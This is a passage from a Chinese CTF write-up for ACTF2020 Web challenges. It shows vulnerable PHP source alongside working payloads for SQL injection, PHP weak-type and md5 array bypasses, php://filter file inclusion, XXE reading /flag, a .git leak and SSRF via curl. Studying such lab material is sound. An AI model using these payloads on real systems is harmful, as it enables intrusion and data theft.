hex(d["x1"]),hex(d["x2"]),hex(d["x3"]),hex(d["x4"]),hex(d["x5"]),hex(d["x6"]),hex(d["x7"]),hex(d["x8"]),hex(d["x9"]),hex(d["x10"])</span></span><br><span class="line">part2 = <span class="number">9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">	part2 ^= d[i]</span><br><span class="line">part2 = str(part2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"actf&#123;%s_%s&#125;"</span>%(part1,part2)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>p.s.这题其实给9个方程就可以做，因为变量必然是Ascii。</p>
</blockquote>
<hr>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="universal-sql"><a href="#universal-sql" class="headerlink" title="universal_sql"></a>universal_sql</h2><ul>
<li>题目描述：你听说过万能密码？？</li>
<li>考察点：sql注入</li>
<li>难度：入门</li>
<li>分值：100</li>
<li>完成人数：11</li>
</ul>
<p>查看源代码，有个<code>index.txt</code>，里面是源码：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = $_POST[username];</span><br><span class="line">$passwd = md5($_POST[passwd]);</span><br><span class="line">$sql = <span class="string">"select username from users where (username='$username') and (pw='$passwd')"</span>;</span><br></pre></td></tr></table></figure></div>

<p>构造<code>sql</code>语句，注释掉查询<code>pw</code>的部分：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from users where (username&#x3D;&#39;admin&#39;)#&#39;) and (pw&#x3D;&#39;$passwd&#39;)&quot;;</span><br></pre></td></tr></table></figure></div>

<p>用户名是<code>admin</code>时显示登录成功：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/universal_sql/1.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="burp" class="fancybox"><img alt="burp" title="burp" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/universal_sql/1.png" src="/img/loading.gif" class="lazyload"></a></p>
<h2 id="茶颜悦色"><a href="#茶颜悦色" class="headerlink" title="茶颜悦色"></a>茶颜悦色</h2><ul>
<li>题目描述：茶颜！快来排队叭！</li>
<li>考察点：py脚本</li>
<li>难度：简单</li>
<li>分值：100</li>
<li>完成人数：9</li>
</ul>
<p>网站链接都是假的…只有翻页能点…查看源码有提示：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--找一找我最喜欢喝的幽兰拿铁!--&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>于是写脚本自动翻页：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># header</span></span><br><span class="line">s=requests.session()                                     </span><br><span class="line">s.headers[<span class="string">'Accept'</span>]=<span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span></span><br><span class="line">s.headers[<span class="string">'Accept-Encoding'</span>]=<span class="string">'gzip, deflate, br'</span></span><br><span class="line">s.headers[<span class="string">'Host'</span>]=<span class="string">'url'</span>                 </span><br><span class="line">s.headers[<span class="string">'Accept-Language'</span>]=<span class="string">'zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,ko;q=0.6'</span></span><br><span class="line">s.headers[<span class="string">'User-Agent'</span>]=<span class="string">'zilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://47.106.94.13:40004'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(i)</span>:</span>                          </span><br><span class="line">    res = s.get(url,params=&#123;<span class="string">'page'</span>:str(i)&#125;)</span><br><span class="line">    res.encoding = res.apparent_encoding</span><br><span class="line">    <span class="keyword">return</span> res.text </span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">'page %d'</span>%i)</span><br><span class="line">    t = get_data(i)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'幽兰拿铁'</span> <span class="keyword">in</span> t[<span class="number">1000</span>:]:</span><br><span class="line">        print(t[<span class="number">1000</span>:])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p>找到拿铁就给<code>flag</code>啦：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/chayan/cy.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="cy" class="fancybox"><img alt="cy" title="cy" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/chayan/cy.png" src="/img/loading.gif" class="lazyload"></a></p>
<h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><ul>
<li>题目描述：-</li>
<li>考察点：sql注入</li>
<li>难度：简单</li>
<li>分值：200</li>
<li>完成人数：10</li>
</ul>
<p>简单的sql注入</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/babysql/sql_page.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="sqlpage" class="fancybox"><img alt="sqlpage" title="sqlpage" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/babysql/sql_page.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>根据输入的id查询用户名和密码</p>
<p><code>id=-1&#39; order by 1,2,3,4 #</code>时回显消失，所以一共是就3列数据</p>
<p>然后删除线那里给了表名，直接<code>union select</code>就能拿到<code>flag</code>，payload:</p>
<blockquote>
<p><code>id=-1&#39; union select 1,flag,3 from flag #</code></p>
</blockquote>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/babysql/sql.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="sql" class="fancybox"><img alt="sql" title="sql" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/babysql/sql.png" src="/img/loading.gif" class="lazyload"></a></p>
<h2 id="whats-git"><a href="#whats-git" class="headerlink" title="whats git"></a>whats git</h2><ul>
<li>题目描述：-</li>
<li>考察点：githack</li>
<li>难度：入门</li>
<li>分值：200</li>
<li>完成人数：6</li>
</ul>
<p><code>Githack</code>，然后找<code>flag</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> find ./ | grep flag </span></span><br><span class="line">./新建文件夹 - 副本 (7)/新建文件夹 - 副本 (3)/新建文件夹 - 副本 (4)/新建文件夹 - 副本 (3)/flag</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash"> cat <span class="string">"./新建文件夹 - 副本 (7)/新建文件夹 - 副本 (3)/新建文件夹 - 副本 (4)/新建文件夹 - 副本 (3)/flag"</span></span></span><br><span class="line">ACTF&#123;.git_leak_is_dangerous&#125;%</span><br></pre></td></tr></table></figure></div>



<h2 id="backup-file"><a href="#backup-file" class="headerlink" title="backup_file"></a>backup_file</h2><ul>
<li>题目描述：-</li>
<li>考察点：bak文件、php弱类型</li>
<li>难度：简单</li>
<li>分值：200</li>
<li>完成人数：8</li>
</ul>
<p>提示<code>Try to find out source file!</code>，于是扫一下目录发现<code>index.php.bak</code>:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>$key == $str</code>时给<code>flag</code>，<code>key</code>必须是数字，而<code>str</code>是字符串</p>
<p>由于php弱类型，<code>str</code>在比较时<code>&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;=123</code></p>
<p>所以让<code>key=123</code>即可绕过比较</p>
<p>payload:</p>
<blockquote>
<p> <a href="http://106.15.207.47:21001/?key=123" target="_blank" rel="noopener">http://106.15.207.47:21001/?key=123</a></p>
</blockquote>
<h2 id="easy-file-include"><a href="#easy-file-include" class="headerlink" title="easy_file_include"></a>easy_file_include</h2><ul>
<li>题目描述：-</li>
<li>考察点：php文件包含</li>
<li>难度：简单</li>
<li>分值：200</li>
<li>完成人数：7</li>
</ul>
<p>首先不会，于是<a href="https://www.jianshu.com/p/6af8e76d22a5" target="_blank" rel="noopener">查资料</a>&lt;-拿这个payload试了下可以用：</p>
<blockquote>
<p><a href="http://106.15.207.47:21002/?file=php://filter/read=convert.base64-encode/resource=./index.php" target="_blank" rel="noopener">http://106.15.207.47:21002/?file=php://filter/read=convert.base64-encode/resource=./index.php</a></p>
</blockquote>
<p>得到源码：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">"php://input"</span>) || stristr($file,<span class="string">"zip://"</span>) || stristr($file,<span class="string">"phar://"</span>) || stristr($file,<span class="string">"data:"</span>))&#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($file)&#123;</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>好像并没有什么用，直接读<code>flag.php</code>发现flag就在注释里…payload如下：</p>
<blockquote>
<p><a href="http://106.15.207.47:21002/?file=php://filter/read=convert.base64-encode/resource=./flag.php" target="_blank" rel="noopener">http://106.15.207.47:21002/?file=php://filter/read=convert.base64-encode/resource=./flag.php</a></p>
</blockquote>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Can you find out the flag?"</span>;</span><br><span class="line"><span class="comment">//ACTF&#123;Fi1e_InClUdE_Is_EaSy&#125;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="easyHTTP"><a href="#easyHTTP" class="headerlink" title="easyHTTP"></a>easyHTTP</h2><ul>
<li>题目描述：-</li>
<li>考察点：HTTP协议</li>
<li>难度：入门</li>
<li>分值：200</li>
<li>完成人数：9</li>
</ul>
<p>题目界面：</p>
<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/1b.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="1b" class="fancybox"><img alt="1b" style="zoom:38%;" title="1b" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/1b.png" src="/img/loading.gif" class="lazyload"></a>

<p>将对应的信息填好，提交后在<code>header</code>中给出下一个<code>php</code>的位置：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/1.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="b1" class="fancybox"><img alt="b1" title="b1" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/1.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>访问之：</p>
<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/2b.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="2b" class="fancybox"><img alt="2b" style="zoom:38%;" title="2b" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/2b.png" src="/img/loading.gif" class="lazyload"></a>

<p>按照要求发送参数，然后在<code>header</code>中又给出下一个<code>php</code>的位置：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/2.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="b2" class="fancybox"><img alt="b2" title="b2" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/2.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>访问之：</p>
<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/3b.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="3b" class="fancybox"><img alt="3b" style="zoom:38%;" title="3b" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/3b.png" src="/img/loading.gif" class="lazyload"></a>

<p>按照要求发送<code>cookie</code>，然后在<code>header</code>中又给出下一个<code>php</code>的位置：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/3.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="b3" class="fancybox"><img alt="b3" title="b3" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/3.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>访问之：<br><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/4b.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="4b" class="fancybox"><img alt="4b" style="zoom:38%;" title="4b" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/4b.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>按照要求<code>XFF</code>，最终拿到flag：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/4.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="b4" class="fancybox"><img alt="b4" title="b4" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/4.png" src="/img/loading.gif" class="lazyload"></a></p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><ul>
<li>题目描述：-</li>
<li>考察点：代码审计、md5绕过</li>
<li>难度：简单</li>
<li>分值：200</li>
<li>完成人数：9</li>
</ul>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'key'</span>] != $_SESSION[<span class="string">'key'</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Wrong key!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>]) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Your password can not be your username!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>$_SESSION[&#39;key&#39;]</code>中并没有值，所以<code>$_POST[&#39;key&#39;]</code>传空值可绕过</p>
<p>查了下，md5可以通过数组绕过：</p>
<blockquote>
<p>传入<code>md5</code>函数的参数为数组类型时返回<code>null</code></p>
</blockquote>
<p>只要向<code>username</code>和<code>password</code>中传两个不同的数组，数组经过md5后<code>null===null</code>即可绕过md5检查</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyphp/1.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="burpa" class="fancybox"><img alt="burpa" title="burpa" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyphp/1.png" src="/img/loading.gif" class="lazyload"></a></p>
<h2 id="幸运数字"><a href="#幸运数字" class="headerlink" title="幸运数字"></a>幸运数字</h2><ul>
<li>题目描述：快来挑选你的幸运数字吧~</li>
<li>考察点：爆破、XXE</li>
<li>难度：中等</li>
<li>分值：200</li>
<li>完成人数：6</li>
</ul>
<p>幸运数5位数，burp爆破得到<code>77777</code>，给了tips:</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/lucky_num/xxe1.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="x1" class="fancybox"><img alt="x1" title="x1" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/lucky_num/xxe1.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>post的数据在<code>&lt;licky_number&gt;</code>这个标签中，由此想到可以注入，刚开始以为是XSS，查了半天也不知道怎么读文件，后来醒过神儿来，这部是XML么，百度了一下，原来是XXE… </p>
<p>payload：</p>
<blockquote>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lucky_number</span>&gt;</span>77777 and flag is <span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">lucky_number</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/lucky_num//xxe2.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="x2" class="fancybox"><img alt="x2" title="x2" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/lucky_num//xxe2.png" src="/img/loading.gif" class="lazyload"></a></p>
<h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><ul>
<li>题目描述：这真不是考密码学….</li>
<li>考察点：curl?</li>
<li>难度：简单</li>
<li>分值：200</li>
<li>完成人数：9</li>
</ul>
<p>查看源码，给了hint：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Nzc3Nzc3MmU2MjYxNmI=heiheihei--&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>解base64，再解hex，得到<code>www.bak</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: s=<span class="string">'Nzc3Nzc3MmU2MjYxNmI='</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: s.decode(<span class="string">'base64'</span>)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">'7777772e62616b'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="string">'7777772e62616b'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">'www.bak'</span></span><br></pre></td></tr></table></figure></div>

<p>下载下来，发现是个zip，解压后给了flag位置（<code>/flag</code>）和源码：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;找找hint吧&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;这里什么也没有噢！&lt;&#x2F;p&gt;</span><br><span class="line">&lt;!--Nzc3Nzc3MmU2MjYxNmI&#x3D;heiheihei--&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;学习一下如何利用下面的代码?</span><br><span class="line">&#x2F;&#x2F;请不要用来做&quot;越界&quot;的操作</span><br><span class="line">error_reporting(0);</span><br><span class="line">function curl($url)&#123;  </span><br><span class="line">    &#x2F;&#x2F; 创建一个新cURL资源</span><br><span class="line">    $ch &#x3D; curl_init();</span><br><span class="line">    &#x2F;&#x2F; 设置URL和相应的选项</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    &#x2F;&#x2F; 抓取URL并把它传递给浏览器</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    &#x2F;&#x2F; 关闭cURL资源，并且释放系统资源</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">curl($url); </span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></div>

<p>有一个<code>curl($url)</code>函数，试了下跟linux的<code>curl</code>命令差不多，功能就是访问目标<code>url</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyweb/curl.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="baidu" class="fancybox"><img alt="baidu" title="baidu" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyweb/curl.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>直接访问服务器本地的<code>/flag</code>即可</p>
